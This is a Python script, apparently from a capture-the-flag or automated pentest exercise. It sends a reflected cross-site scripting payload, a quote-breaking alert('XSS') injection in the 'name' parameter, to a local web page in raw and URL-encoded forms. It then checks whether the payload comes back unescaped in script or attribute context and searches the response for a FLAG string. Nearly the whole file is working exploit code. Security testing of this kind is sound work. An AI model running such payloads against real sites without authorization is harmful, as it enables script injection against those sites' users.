import requests
import urllib.parse
import re
import sys

# Target URL
base_url = "http://127.0.0.1:33119/page"
payload = 'name=");alert(\'XSS\');//'

print(f"[+] Testing XSS payload: {payload}")
print(f"[+] Base URL: {base_url}")
print("-" * 60)

# Try both encoded and unencoded versions
test_cases = [
    ("URL Encoded", urllib.parse.quote(payload)),
    ("Raw", payload)
]

for test_name, test_payload in test_cases:
    try:
        print(f"\n[+] Testing with {test_name} payload...")
        full_url = f"{base_url}?name={test_payload}"
        print(f"[+] Request URL: {full_url}")
        
        # Send GET request with timeout
        response = requests.get(full_url, timeout=15)
        
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Length: {len(response.text)} bytes")
        print(f"[+] Response Headers: {dict(response.headers)}")
        print("-" * 40)
        
        # Analyze response content
        content = response.text
        
        # Print first 2000 chars of response for analysis
        print(f"[+] Response Content (first 2000 chars):")
        print(content[:2000])
        if len(content) > 2000:
            print(f"... ({len(content) - 2000} more characters)")
        print("-" * 40)
        
        # Check for FLAG pattern first
        print(f"\n[+] Searching for FLAG{{}} pattern...")
        flag_matches = re.findall(r'FLAG\{[^}]+\}', content)
        if flag_matches:
            print(f"[!] FLAG FOUND: {flag_matches[0]}")
            confidence = 0.9
        else:
            print("[-] No FLAG pattern found")
            confidence = 0.3
        
        # Check for payload reflection
        print(f"\n[+] Checking for payload reflection...")
        if payload in content:
            print(f"[!] Original payload found in response!")
            confidence = max(0.6, confidence)
        else:
            # Check for encoded versions
            encoded_payload = urllib.parse.quote(payload)
            if encoded_payload in content:
                print(f"[!] URL-encoded payload found in response!")
                confidence = max(0.5, confidence)
            else:
                print("[-] Payload not reflected")
        
        # Check for alert('XSS') execution
        print(f"\n[+] Checking for XSS execution indicators...")
        if "alert('XSS')" in content:
            # Check if it's properly escaped
            if "&#x27;" in content or "&#39;" in content or "&quot;" in content:
                print("[-] alert('XSS') found but HTML-encoded (XSS blocked)")
                confidence = max(0.3, confidence)
            else:
                print("[!] Unencoded alert('XSS') found (XSS likely successful)")
                confidence = max(0.7, confidence)
        else:
            print("[-] alert('XSS') not found in response")
        
        # Look for JavaScript context
        print(f"\n[+] Checking for JavaScript context...")
        script_tags = re.findall(r'<script[^>]*>(.*?)</script>', content, re.DOTALL | re.IGNORECASE)
        if script_tags:
            print(f"[+] Found {len(script_tags)} script block(s)")
            for i, script in enumerate(script_tags[:2]):  # Check first 2
                if payload in script or "alert('XSS')" in script:
                    print(f"[!] Payload found in script block {i+1}!")
                    print(f"    Script content: {script[:200]}...")
                    confidence = max(0.7, confidence)
                    break
        
        # Look for attribute context
        attr_matches = re.findall(r'<[^>]+["\'][^"\']*["\'][^>]*>', content)
        for attr in attr_matches:
            if payload in attr:
                print(f"[!] Payload found in HTML attribute context")
                print(f"    Attribute: {attr[:150]}...")
                confidence = max(0.6, confidence)
                break
        
        print(f"\n[+] Confidence Score for {test_name}: {confidence}")
        print("=" * 60)
        
        # If we found a flag, stop testing
        if flag_matches:
            sys.exit(0)
            
    except requests.exceptions.Timeout:
        print(f"[-] {test_name} test timed out")
        continue
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error with {test_name}: {e}")
        continue
    except Exception as e:
        print(f"[-] Error with {test_name}: {e}")
        import traceback
        traceback.print_exc()
        continue

print("\n[+] Testing completed")
if not flag_matches:
    print("[-] No FLAG found in any test case")
    confidence = 0.2
    print(f"[+] Final Confidence: {confidence}")
